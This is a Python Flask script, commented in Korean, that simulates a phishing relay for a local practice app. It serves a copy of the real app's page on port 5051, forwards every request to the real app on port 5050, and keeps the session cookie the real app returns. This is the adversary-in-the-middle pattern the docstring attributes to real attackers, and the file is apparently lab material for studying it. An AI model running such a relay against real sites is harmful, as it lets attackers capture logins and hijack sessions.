"""피싱 중계 서버 시뮬레이션. 진짜 앱(5050)과 같은 화면을 5051 포트에서 보여 주고,
받은 요청을 진짜 앱에 그대로 전달합니다. 실제 공격자가 쓰는 '중간자 중계'와 같은 구조입니다.
연습용 앱(app.py)에만 쓰세요."""
import urllib.error
import urllib.request

from flask import Flask, Response, request

from app import PAGE

REAL = "http://127.0.0.1:5050"
app = Flask(__name__)
cookie = {"value": ""}      # 공격자 서버가 진짜 앱과 주고받는 세션 쿠키


@app.get("/")
def index():
    return PAGE


@app.route("/<path:path>", methods=["GET", "POST"])
def relay(path):
    req = urllib.request.Request(
        f"{REAL}/{path}",
        data=request.get_data() if request.method == "POST" else None,
        method=request.method,
        headers={"Content-Type": "application/json", "Cookie": cookie["value"]},
    )
    try:
        resp = urllib.request.urlopen(req, timeout=10)
    except urllib.error.HTTPError as exc:
        resp = exc
    set_cookie = resp.headers.get("Set-Cookie")
    if set_cookie:
        cookie["value"] = set_cookie.split(";")[0]
    return Response(resp.read(), status=resp.status, mimetype="application/json")


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5051)
